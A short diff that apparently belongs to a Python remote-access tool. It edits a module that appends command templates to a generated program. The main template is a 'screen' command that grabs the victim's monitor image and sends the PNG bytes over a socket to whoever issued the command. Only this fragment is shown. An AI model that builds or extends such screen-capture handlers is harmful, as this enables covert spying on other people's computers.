@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -17,7 +16,7 @@ def screen():
         monitor = sct.monitors[1]
         im = sct.grab(monitor)
         raw_bytes = mss.tools.to_png(im.rgb, im.size)
-        main_send(raw_bytes, s)''')
+        send_all(s,raw_bytes)''')
         config.logics.append('''
             elif command == "screen":
                 screen()''')
